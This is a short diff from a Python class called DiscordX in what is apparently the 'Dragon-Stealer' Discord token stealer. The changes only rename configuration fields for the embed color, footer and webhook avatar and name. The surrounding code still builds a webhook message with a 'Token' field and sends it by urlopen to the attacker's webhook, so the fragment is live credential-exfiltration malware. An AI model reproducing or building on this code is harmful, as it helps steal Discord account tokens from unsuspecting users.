@@ -280,7 +280,7 @@ class DiscordX(): #Updating soon
             "",
             "embeds": [{
                 "color":
-                cc.color,
+                cc.eb_color,
                 "fields": [
                     {
                         "name": ":tickets:   -   Token:",
@@ -322,7 +322,7 @@ class DiscordX(): #Updating soon
                     "icon_url": f"{pfp}",
                 },
                 "footer": {
-                    "text": cc.footer,
+                    "text": cc.eb_footer,
                     "icon_url": "",
                 },
                 "thumbnail": {
@@ -330,9 +330,9 @@ class DiscordX(): #Updating soon
                 },
             }],
             "avatar_url":
-            cc.avatar,
+            cc.wh_avatar,
             "username":
-            "Dragon-Stealer",
+            cc.wh_name,
             "attachments": [],
         }
         urlopen(Request(self.webhook, data=dumps(data).encode(), headers=headers))
